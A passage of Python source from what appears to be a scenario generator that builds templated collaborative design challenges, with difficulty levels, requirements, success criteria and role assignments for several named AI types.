            "estimated_duration": {"easy": "1-2 hours", "medium": "2-4 hours", "hard": "4-8 hours", "expert": "6-12 hours"}.get(difficulty, "2-4 hours")
        }
    
    def _get_fallback_olympus_scenario(self, ai_type: str, difficulty: str, user_id: str) -> Dict[str, Any]:
        """Get fallback Olympus Treaty scenario when generation fails"""
        return {
            "name": f"Olympus Treaty: {ai_type.title()} Mastery Test",
            "description": f"Demonstrate mastery of {ai_type} AI capabilities through a comprehensive challenge that tests core competencies and advanced problem-solving skills.",
            "objective": "Complete the challenge successfully while demonstrating deep understanding and innovative thinking.",
            "requirements": ["Core competency demonstration", "Problem-solving excellence", "Innovative approach"],
            "success_criteria": ["Challenge completed", "High-quality solution", "Innovation demonstrated"],
            "complexity_score": 7.0,
            "estimated_duration": "2-4 hours",
            "olympus_treaty": True,
            "test_type": "general",
            "ai_type": ai_type,
            "difficulty": difficulty,
            "user_id": user_id,
            "scenario_id": f"olympus_fallback_{ai_type}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "live_environment": {
                "is_live": True,
                "real_vulnerabilities": True,
                "dynamic_content": True,
                "interactive_elements": True,
                "real_time_feedback": True,
                "container_id": f"olympus_fallback_{ai_type}_{user_id}_{random.randint(1000, 9999)}",
                "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
                "port": 8080 + random.randint(0, 9)
            }
        }

    async def generate_collaborative_test_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate collaborative testing scenarios with multiple AI types working together"""
        try:
            # Define collaborative scenario types
            collaborative_types = [
                "multi_ai_system_design",
                "cross_ai_integration",
                "distributed_problem_solving",
                "ai_ecosystem_optimization",
                "collaborative_security_audit",
                "multi_ai_architecture_review",
                "cross_domain_innovation",
                "ai_team_performance_optimization",
                "collaborative_ml_pipeline",
                "multi_ai_monitoring_system"
            ]
            
            # Select collaborative scenario type
            selected_type = self._select_collaborative_scenario_type(ai_types, difficulty, collaborative_types)
            
            # Generate scenario based on type
            if selected_type == "multi_ai_system_design":
                scenario = await self._generate_multi_ai_system_scenario(ai_types, difficulty, user_id)
            elif selected_type == "cross_ai_integration":
                scenario = await self._generate_cross_ai_integration_scenario(ai_types, difficulty, user_id)
            elif selected_type == "distributed_problem_solving":
                scenario = await self._generate_distributed_problem_scenario(ai_types, difficulty, user_id)
            elif selected_type == "ai_ecosystem_optimization":
                scenario = await self._generate_ai_ecosystem_scenario(ai_types, difficulty, user_id)
            elif selected_type == "collaborative_security_audit":
                scenario = await self._generate_collaborative_security_scenario(ai_types, difficulty, user_id)
            elif selected_type == "multi_ai_architecture_review":
                scenario = await self._generate_multi_ai_architecture_scenario(ai_types, difficulty, user_id)
            elif selected_type == "cross_domain_innovation":
                scenario = await self._generate_cross_domain_innovation_scenario(ai_types, difficulty, user_id)
            elif selected_type == "ai_team_performance_optimization":
                scenario = await self._generate_ai_team_performance_scenario(ai_types, difficulty, user_id)
            elif selected_type == "collaborative_ml_pipeline":
                scenario = await self._generate_collaborative_ml_scenario(ai_types, difficulty, user_id)
            elif selected_type == "multi_ai_monitoring_system":
                scenario = await self._generate_multi_ai_monitoring_scenario(ai_types, difficulty, user_id)
            else:
                scenario = await self._generate_general_collaborative_scenario(ai_types, difficulty, user_id)
            
            # Add collaborative testing specific metadata
            scenario["collaborative_test"] = True
            scenario["ai_types"] = ai_types
            scenario["test_type"] = selected_type
            scenario["difficulty"] = difficulty
            scenario["user_id"] = user_id
            scenario["scenario_id"] = f"collaborative_{'_'.join(ai_types)}_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            scenario["live_environment"] = {
                "is_live": True,
                "real_vulnerabilities": True,
                "dynamic_content": True,
                "interactive_elements": True,
                "real_time_feedback": True,
                "multi_ai_coordination": True,
                "container_id": f"collaborative_{'_'.join(ai_types)}_{user_id}_{random.randint(1000, 9999)}",
                "target_url": f"http://localhost:{8080 + random.randint(0, 9)}",
                "port": 8080 + random.randint(0, 9)
            }
            
            return scenario
            
        except Exception as e:
            logger.error(f"Error generating collaborative test scenario: {str(e)}")
            return self._get_fallback_collaborative_scenario(ai_types, difficulty, user_id)
    
    def _select_collaborative_scenario_type(self, ai_types: List[str], difficulty: str, collaborative_types: List[str]) -> str:
        """Select appropriate collaborative scenario type based on AI types and difficulty"""
        # AI type combinations and their preferred scenarios
        ai_combination_preferences = {
            ("imperium", "guardian"): ["multi_ai_system_design", "collaborative_security_audit"],
            ("imperium", "sandbox"): ["cross_domain_innovation", "multi_ai_architecture_review"],
            ("imperium", "conquest"): ["ai_ecosystem_optimization", "multi_ai_system_design"],
            ("guardian", "sandbox"): ["collaborative_security_audit", "cross_domain_innovation"],
            ("guardian", "conquest"): ["collaborative_security_audit", "ai_team_performance_optimization"],
            ("sandbox", "conquest"): ["cross_domain_innovation", "collaborative_ml_pipeline"],
            ("imperium", "guardian", "sandbox"): ["multi_ai_system_design", "cross_domain_innovation"],
            ("imperium", "guardian", "conquest"): ["ai_ecosystem_optimization", "multi_ai_architecture_review"],
            ("imperium", "sandbox", "conquest"): ["cross_domain_innovation", "multi_ai_monitoring_system"],
            ("guardian", "sandbox", "conquest"): ["collaborative_security_audit", "ai_team_performance_optimization"],
            ("imperium", "guardian", "sandbox", "conquest"): ["multi_ai_system_design", "ai_ecosystem_optimization"]
        }
        
        # Sort AI types for consistent key lookup
        sorted_ai_types = tuple(sorted(ai_types))
        preferred_scenarios = ai_combination_preferences.get(sorted_ai_types, collaborative_types)
        
        # Difficulty preferences
        difficulty_preferences = {
            "easy": ["multi_ai_monitoring_system", "ai_team_performance_optimization"],
            "medium": ["cross_ai_integration", "collaborative_ml_pipeline"],
            "hard": ["multi_ai_system_design", "collaborative_security_audit"],
            "expert": ["ai_ecosystem_optimization", "cross_domain_innovation"]
        }
        
        difficulty_preferred = difficulty_preferences.get(difficulty, collaborative_types)
        
        # Combine preferences and select
        combined_preferences = list(set(preferred_scenarios) & set(difficulty_preferred))
        if combined_preferences:
            return random.choice(combined_preferences)
        elif preferred_scenarios:
            return random.choice(preferred_scenarios)
        else:
            return random.choice(collaborative_types)
    
    async def _generate_multi_ai_system_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate multi-AI system design scenario"""
        scenarios = {
            "easy": {
                "name": "Multi-AI Communication Protocol",
                "description": "Design a communication protocol that enables different AI types to collaborate effectively on shared tasks.",
                "objective": "Create a robust communication system that allows seamless collaboration between different AI types.",
                "requirements": ["Protocol design", "Message format", "Error handling", "Performance optimization"],
                "success_criteria": ["Protocol is functional", "Communication is reliable", "Performance is acceptable"]
            },
            "medium": {
                "name": "Distributed AI Decision Making",
                "description": "Design a distributed decision-making system where multiple AI types contribute to complex problem-solving.",
                "objective": "Create a system that leverages the strengths of different AI types for optimal decision-making.",
                "requirements": ["Decision framework", "Consensus mechanisms", "Conflict resolution", "Result aggregation"],
                "success_criteria": ["Decisions are optimal", "Consensus is achieved", "Conflicts are resolved"]
            },
            "hard": {
                "name": "AI Ecosystem Architecture",
                "description": "Design a complete AI ecosystem architecture that integrates multiple AI types into a cohesive system.",
                "objective": "Create an architecture that maximizes the value of different AI types working together.",
                "requirements": ["System architecture", "Integration patterns", "Scalability design", "Fault tolerance"],
                "success_criteria": ["Architecture is scalable", "Integration is seamless", "System is fault-tolerant"]
            },
            "expert": {
                "name": "Autonomous AI Federation",
                "description": "Design an autonomous federation of AI systems that can self-organize and optimize their collaboration.",
                "objective": "Create a self-managing AI federation that can adapt and optimize its collaborative behavior.",
                "requirements": ["Autonomy mechanisms", "Self-organization", "Optimization algorithms", "Adaptive behavior"],
                "success_criteria": ["Federation is autonomous", "Self-organization works", "Optimization is effective"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-3 hours", "medium": "3-5 hours", "hard": "5-8 hours", "expert": "8-12 hours"}.get(difficulty, "3-5 hours")
        }
    
    async def _generate_cross_ai_integration_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate cross-AI integration scenario"""
        scenarios = {
            "easy": {
                "name": "API Integration Between AI Types",
                "description": "Design and implement APIs that enable different AI types to share data and functionality.",
                "objective": "Create seamless integration between different AI types through well-designed APIs.",
                "requirements": ["API design", "Data formats", "Authentication", "Error handling"],
                "success_criteria": ["APIs are functional", "Integration is seamless", "Data sharing works"]
            },
            "medium": {
                "name": "Shared Knowledge Base Integration",
                "description": "Design a shared knowledge base that multiple AI types can access and contribute to.",
                "objective": "Create a collaborative knowledge system that benefits all participating AI types.",
                "requirements": ["Knowledge schema", "Access control", "Conflict resolution", "Consistency management"],
                "success_criteria": ["Knowledge is shared", "Access is controlled", "Consistency is maintained"]
            },
            "hard": {
                "name": "Real-Time AI Coordination System",
                "description": "Design a real-time coordination system that enables multiple AI types to work together on time-sensitive tasks.",
                "objective": "Create a system that enables effective real-time collaboration between different AI types.",
                "requirements": ["Real-time communication", "Synchronization", "Latency optimization", "Fault tolerance"],
                "success_criteria": ["Coordination is real-time", "Synchronization works", "Latency is acceptable"]
            },
            "expert": {
                "name": "Adaptive AI Integration Framework",
                "description": "Design an adaptive integration framework that can automatically optimize collaboration between different AI types.",
                "objective": "Create a framework that can learn and adapt to optimize AI collaboration patterns.",
                "requirements": ["Adaptive algorithms", "Learning mechanisms", "Optimization strategies", "Performance monitoring"],
                "success_criteria": ["Framework is adaptive", "Learning is effective", "Optimization works"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.5, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-10 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_distributed_problem_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate distributed problem solving scenario"""
        scenarios = {
            "easy": {
                "name": "Parallel Task Distribution",
                "description": "Design a system that distributes tasks across multiple AI types for parallel processing.",
                "objective": "Create an efficient task distribution system that maximizes the use of different AI capabilities.",
                "requirements": ["Task analysis", "Distribution algorithms", "Load balancing", "Result aggregation"],
                "success_criteria": ["Tasks are distributed efficiently", "Load is balanced", "Results are aggregated correctly"]
            },
            "medium": {
                "name": "Collaborative Problem Decomposition",
                "description": "Design a system that breaks down complex problems into sub-problems for different AI types to solve.",
                "objective": "Create an effective problem decomposition system that leverages AI specialization.",
                "requirements": ["Problem analysis", "Decomposition strategy", "Sub-problem assignment", "Solution synthesis"],
                "success_criteria": ["Problems are decomposed effectively", "Sub-problems are assigned appropriately", "Solutions are synthesized correctly"]
            },
            "hard": {
                "name": "Distributed Optimization Problem",
                "description": "Design a distributed optimization system where multiple AI types work together to solve complex optimization problems.",
                "objective": "Create a system that can solve complex optimization problems through AI collaboration.",
                "requirements": ["Optimization framework", "Distributed algorithms", "Convergence mechanisms", "Solution quality"],
                "success_criteria": ["Optimization converges", "Solution quality is high", "Collaboration is effective"]
            },
            "expert": {
                "name": "Emergent Problem Solving",
                "description": "Design a system where AI collaboration leads to emergent problem-solving capabilities beyond individual AI capabilities.",
                "objective": "Create a system that exhibits emergent problem-solving behavior through AI collaboration.",
                "requirements": ["Emergence mechanisms", "Collaboration patterns", "Capability enhancement", "Problem complexity"],
                "success_criteria": ["Emergent behavior occurs", "Problem-solving is enhanced", "Collaboration is effective"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-12 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_ai_ecosystem_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate AI ecosystem optimization scenario"""
        scenarios = {
            "easy": {
                "name": "AI Resource Optimization",
                "description": "Design a system that optimizes resource allocation across multiple AI types for maximum efficiency.",
                "objective": "Create an efficient resource management system that maximizes AI ecosystem performance.",
                "requirements": ["Resource analysis", "Allocation algorithms", "Performance monitoring", "Optimization strategies"],
                "success_criteria": ["Resources are optimized", "Performance is maximized", "Efficiency is improved"]
            },
            "medium": {
                "name": "AI Workflow Optimization",
                "description": "Design an optimized workflow system that coordinates multiple AI types for complex tasks.",
                "objective": "Create an efficient workflow system that maximizes the value of AI collaboration.",
                "requirements": ["Workflow design", "Coordination mechanisms", "Performance optimization", "Error handling"],
                "success_criteria": ["Workflow is efficient", "Coordination is effective", "Performance is optimized"]
            },
            "hard": {
                "name": "AI Ecosystem Architecture Optimization",
                "description": "Design an optimized architecture for an AI ecosystem that maximizes collaboration and performance.",
                "objective": "Create an architecture that optimizes the entire AI ecosystem for maximum value.",
                "requirements": ["Architecture design", "Integration optimization", "Scalability planning", "Performance tuning"],
                "success_criteria": ["Architecture is optimal", "Integration is efficient", "Scalability is achieved"]
            },
            "expert": {
                "name": "Self-Optimizing AI Ecosystem",
                "description": "Design a self-optimizing AI ecosystem that can automatically improve its own performance and collaboration.",
                "objective": "Create an ecosystem that can continuously optimize itself for maximum effectiveness.",
                "requirements": ["Self-optimization mechanisms", "Learning algorithms", "Performance monitoring", "Adaptive behavior"],
                "success_criteria": ["Ecosystem self-optimizes", "Performance improves", "Adaptation is effective"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.5, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-12 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_collaborative_security_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate collaborative security audit scenario"""
        scenarios = {
            "easy": {
                "name": "Multi-AI Security Assessment",
                "description": "Design a collaborative security assessment system where different AI types contribute to comprehensive security analysis.",
                "objective": "Create a comprehensive security assessment system that leverages different AI capabilities.",
                "requirements": ["Security analysis", "Vulnerability detection", "Risk assessment", "Report generation"],
                "success_criteria": ["Security is assessed comprehensively", "Vulnerabilities are detected", "Risk is assessed accurately"]
            },
            "medium": {
                "name": "Collaborative Threat Detection",
                "description": "Design a collaborative threat detection system that uses multiple AI types to identify and respond to security threats.",
                "objective": "Create an effective threat detection system that leverages AI collaboration.",
                "requirements": ["Threat detection", "Response coordination", "False positive reduction", "Real-time monitoring"],
                "success_criteria": ["Threats are detected", "Response is coordinated", "False positives are minimized"]
            },
            "hard": {
                "name": "Distributed Security Architecture",
                "description": "Design a distributed security architecture that uses multiple AI types for comprehensive protection.",
                "objective": "Create a robust security architecture that leverages AI collaboration for maximum protection.",
                "requirements": ["Security architecture", "Distributed protection", "Coordination mechanisms", "Incident response"],
                "success_criteria": ["Architecture is robust", "Protection is comprehensive", "Response is effective"]
            },
            "expert": {
                "name": "Adaptive Security Ecosystem",
                "description": "Design an adaptive security ecosystem that can learn and adapt to new threats through AI collaboration.",
                "objective": "Create a security ecosystem that can continuously adapt and improve through AI collaboration.",
                "requirements": ["Adaptive mechanisms", "Learning algorithms", "Threat evolution", "Collaborative response"],
                "success_criteria": ["Ecosystem adapts", "Learning is effective", "Response is collaborative"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-10 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_multi_ai_architecture_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate multi-AI architecture review scenario"""
        scenarios = {
            "easy": {
                "name": "Architecture Review Collaboration",
                "description": "Design a collaborative architecture review system where different AI types contribute to comprehensive system analysis.",
                "objective": "Create a comprehensive architecture review system that leverages different AI perspectives.",
                "requirements": ["Architecture analysis", "Review coordination", "Issue identification", "Recommendation generation"],
                "success_criteria": ["Architecture is reviewed comprehensively", "Issues are identified", "Recommendations are generated"]
            },
            "medium": {
                "name": "Distributed Architecture Design",
                "description": "Design a distributed architecture design system where multiple AI types collaborate on complex system design.",
                "objective": "Create an effective architecture design system that leverages AI collaboration.",
                "requirements": ["Design coordination", "Component integration", "Quality assurance", "Documentation"],
                "success_criteria": ["Architecture is designed effectively", "Components integrate well", "Quality is assured"]
            },
            "hard": {
                "name": "Multi-Domain Architecture Synthesis",
                "description": "Design a system that synthesizes architecture designs from multiple domains through AI collaboration.",
                "objective": "Create a system that can synthesize complex architectures across multiple domains.",
                "requirements": ["Domain analysis", "Synthesis algorithms", "Integration strategies", "Validation mechanisms"],
                "success_criteria": ["Architecture is synthesized", "Domains are integrated", "Design is validated"]
            },
            "expert": {
                "name": "Emergent Architecture Design",
                "description": "Design a system where AI collaboration leads to emergent architecture patterns and innovations.",
                "objective": "Create a system that can generate innovative architecture patterns through AI collaboration.",
                "requirements": ["Emergence mechanisms", "Innovation algorithms", "Pattern recognition", "Design evolution"],
                "success_criteria": ["Emergent patterns are generated", "Innovation occurs", "Design evolves effectively"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.5, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-12 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_cross_domain_innovation_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate cross-domain innovation scenario"""
        scenarios = {
            "easy": {
                "name": "Cross-Domain Knowledge Transfer",
                "description": "Design a system that enables knowledge transfer between different domains through AI collaboration.",
                "objective": "Create a system that can transfer valuable knowledge between different domains.",
                "requirements": ["Knowledge mapping", "Transfer mechanisms", "Validation processes", "Integration strategies"],
                "success_criteria": ["Knowledge is transferred", "Transfer is validated", "Integration is successful"]
            },
            "medium": {
                "name": "Multi-Domain Problem Solving",
                "description": "Design a system that solves problems by combining insights from multiple domains through AI collaboration.",
                "objective": "Create a system that can solve complex problems by leveraging multiple domain perspectives.",
                "requirements": ["Domain analysis", "Insight combination", "Solution synthesis", "Validation"],
                "success_criteria": ["Problems are solved", "Insights are combined", "Solutions are validated"]
            },
            "hard": {
                "name": "Emergent Innovation Generation",
                "description": "Design a system that generates innovative solutions through the combination of insights from multiple domains.",
                "objective": "Create a system that can generate breakthrough innovations through cross-domain collaboration.",
                "requirements": ["Innovation mechanisms", "Domain synthesis", "Creativity algorithms", "Validation processes"],
                "success_criteria": ["Innovations are generated", "Domains are synthesized", "Creativity is enhanced"]
            },
            "expert": {
                "name": "Disruptive Innovation Ecosystem",
                "description": "Design an ecosystem that can generate disruptive innovations through AI collaboration across multiple domains.",
                "objective": "Create an ecosystem that can generate truly disruptive innovations through AI collaboration.",
                "requirements": ["Disruption mechanisms", "Ecosystem design", "Innovation algorithms", "Market analysis"],
                "success_criteria": ["Disruptive innovations are generated", "Ecosystem is effective", "Market impact is analyzed"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.5}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-12 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_ai_team_performance_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate AI team performance optimization scenario"""
        scenarios = {
            "easy": {
                "name": "Team Performance Monitoring",
                "description": "Design a system that monitors and optimizes the performance of AI teams working together.",
                "objective": "Create a system that can monitor and improve AI team performance.",
                "requirements": ["Performance metrics", "Monitoring systems", "Optimization algorithms", "Feedback mechanisms"],
                "success_criteria": ["Performance is monitored", "Optimization is effective", "Feedback is provided"]
            },
            "medium": {
                "name": "Collaborative Performance Optimization",
                "description": "Design a system that optimizes the collaborative performance of multiple AI types.",
                "objective": "Create a system that maximizes the collaborative performance of AI teams.",
                "requirements": ["Collaboration analysis", "Optimization strategies", "Performance measurement", "Improvement mechanisms"],
                "success_criteria": ["Collaboration is optimized", "Performance is measured", "Improvements are implemented"]
            },
            "hard": {
                "name": "Adaptive Team Formation",
                "description": "Design a system that can dynamically form and optimize AI teams based on task requirements.",
                "objective": "Create a system that can form optimal AI teams for different tasks.",
                "requirements": ["Team formation algorithms", "Task analysis", "Capability matching", "Performance prediction"],
                "success_criteria": ["Teams are formed optimally", "Tasks are matched well", "Performance is predicted accurately"]
            },
            "expert": {
                "name": "Self-Optimizing AI Teams",
                "description": "Design a system where AI teams can self-optimize their performance and collaboration patterns.",
                "objective": "Create a system where AI teams can continuously improve their own performance.",
                "requirements": ["Self-optimization mechanisms", "Learning algorithms", "Performance evolution", "Collaboration adaptation"],
                "success_criteria": ["Teams self-optimize", "Learning is effective", "Performance evolves"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-10 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_collaborative_ml_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate collaborative ML pipeline scenario"""
        scenarios = {
            "easy": {
                "name": "Distributed Data Processing",
                "description": "Design a distributed data processing pipeline that leverages multiple AI types for efficient data handling.",
                "objective": "Create an efficient data processing pipeline that maximizes AI collaboration.",
                "requirements": ["Data distribution", "Processing coordination", "Result aggregation", "Performance optimization"],
                "success_criteria": ["Data is processed efficiently", "Coordination is effective", "Results are aggregated correctly"]
            },
            "medium": {
                "name": "Collaborative Model Training",
                "description": "Design a collaborative model training system where multiple AI types contribute to ML model development.",
                "objective": "Create an effective model training system that leverages AI collaboration.",
                "requirements": ["Training coordination", "Model contribution", "Quality assurance", "Performance optimization"],
                "success_criteria": ["Training is collaborative", "Models are improved", "Quality is assured"]
            },
            "hard": {
                "name": "Multi-AI Model Ensemble",
                "description": "Design a model ensemble system that combines predictions from multiple AI types for improved accuracy.",
                "objective": "Create an ensemble system that maximizes prediction accuracy through AI collaboration.",
                "requirements": ["Ensemble design", "Prediction combination", "Accuracy optimization", "Performance monitoring"],
                "success_criteria": ["Ensemble is effective", "Accuracy is improved", "Performance is monitored"]
            },
            "expert": {
                "name": "Emergent ML Capabilities",
                "description": "Design a system where AI collaboration leads to emergent ML capabilities beyond individual AI capabilities.",
                "objective": "Create a system that exhibits emergent ML capabilities through AI collaboration.",
                "requirements": ["Emergence mechanisms", "Capability enhancement", "Learning algorithms", "Performance measurement"],
                "success_criteria": ["Emergent capabilities occur", "Learning is enhanced", "Performance is measured"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.5, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-10 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_multi_ai_monitoring_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate multi-AI monitoring system scenario"""
        scenarios = {
            "easy": {
                "name": "Distributed System Monitoring",
                "description": "Design a distributed monitoring system that uses multiple AI types to monitor complex systems.",
                "objective": "Create an effective monitoring system that leverages AI collaboration.",
                "requirements": ["Monitoring design", "Data collection", "Alert coordination", "Performance tracking"],
                "success_criteria": ["Monitoring is comprehensive", "Alerts are coordinated", "Performance is tracked"]
            },
            "medium": {
                "name": "Collaborative Anomaly Detection",
                "description": "Design a collaborative anomaly detection system that uses multiple AI types to identify system anomalies.",
                "objective": "Create an effective anomaly detection system that leverages AI collaboration.",
                "requirements": ["Anomaly detection", "Collaboration mechanisms", "False positive reduction", "Response coordination"],
                "success_criteria": ["Anomalies are detected", "Collaboration is effective", "False positives are minimized"]
            },
            "hard": {
                "name": "Predictive Monitoring System",
                "description": "Design a predictive monitoring system that uses multiple AI types to predict and prevent system issues.",
                "objective": "Create a predictive monitoring system that can prevent issues through AI collaboration.",
                "requirements": ["Prediction algorithms", "Prevention mechanisms", "Collaboration patterns", "Performance optimization"],
                "success_criteria": ["Predictions are accurate", "Prevention is effective", "Collaboration is optimized"]
            },
            "expert": {
                "name": "Self-Healing Monitoring System",
                "description": "Design a self-healing monitoring system that can automatically detect and resolve issues through AI collaboration.",
                "objective": "Create a monitoring system that can automatically heal itself through AI collaboration.",
                "requirements": ["Self-healing mechanisms", "Automation algorithms", "Collaboration patterns", "Performance optimization"],
                "success_criteria": ["System self-heals", "Automation is effective", "Collaboration is optimized"]
            }
        }
        
        scenario = scenarios.get(difficulty, scenarios["medium"])
        return {
            "name": f"Collaborative Test: {scenario['name']}",
            "description": scenario["description"],
            "objective": scenario["objective"],
            "requirements": scenario["requirements"],
            "success_criteria": scenario["success_criteria"],
            "ai_roles": self._assign_ai_roles(ai_types, scenario["name"]),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-10 hours"}.get(difficulty, "3-6 hours")
        }
    
    async def _generate_general_collaborative_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Generate general collaborative scenario as fallback"""
        return {
            "name": f"Collaborative Test: Multi-AI {difficulty.title()} Challenge",
            "description": f"Complete a comprehensive collaborative challenge that tests the ability of {', '.join(ai_types)} AI types to work together effectively on complex problems.",
            "objective": "Demonstrate effective collaboration between different AI types to solve complex, multi-faceted challenges.",
            "requirements": ["Collaboration mechanisms", "Task coordination", "Result integration", "Performance optimization"],
            "success_criteria": ["Collaboration is effective", "Tasks are coordinated", "Results are integrated", "Performance is optimized"],
            "ai_roles": self._assign_ai_roles(ai_types, "General Collaborative Challenge"),
            "complexity_score": {"easy": 4.0, "medium": 7.0, "hard": 8.5, "expert": 9.0}.get(difficulty, 7.0),
            "estimated_duration": {"easy": "2-4 hours", "medium": "3-6 hours", "hard": "5-8 hours", "expert": "6-12 hours"}.get(difficulty, "3-6 hours")
        }
    
    def _assign_ai_roles(self, ai_types: List[str], scenario_name: str) -> Dict[str, str]:
        """Assign specific roles to each AI type based on their strengths and the scenario"""
        role_assignments = {}
        
        for ai_type in ai_types:
            if ai_type == "imperium":
                role_assignments[ai_type] = "System Architecture & Coordination Lead"
            elif ai_type == "guardian":
                role_assignments[ai_type] = "Security & Quality Assurance Lead"
            elif ai_type == "sandbox":
                role_assignments[ai_type] = "Innovation & Creative Problem Solving Lead"
            elif ai_type == "conquest":
                role_assignments[ai_type] = "Implementation & User Experience Lead"
            else:
                role_assignments[ai_type] = "General Contributor"
        
        return role_assignments
    
    def _get_fallback_collaborative_scenario(self, ai_types: List[str], difficulty: str, user_id: str) -> Dict[str, Any]:
        """Get fallback collaborative scenario when generation fails"""
        return {
